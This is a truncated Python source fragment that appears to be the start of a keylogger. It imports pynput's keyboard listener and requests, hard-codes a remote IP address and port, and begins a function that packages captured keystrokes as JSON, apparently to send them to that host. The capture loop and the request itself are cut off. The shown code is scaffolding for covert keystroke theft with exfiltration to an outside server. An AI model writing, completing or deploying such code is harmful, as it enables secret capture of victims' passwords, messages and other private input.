from pynput import keyboard
import requests 
import json
import threading
text = ""
ip_adress = "106.198.0.32"
port_num = "7070"
time = 10
def send_req():
  try:
    payload = json.dumps({"keyboardData" : text})
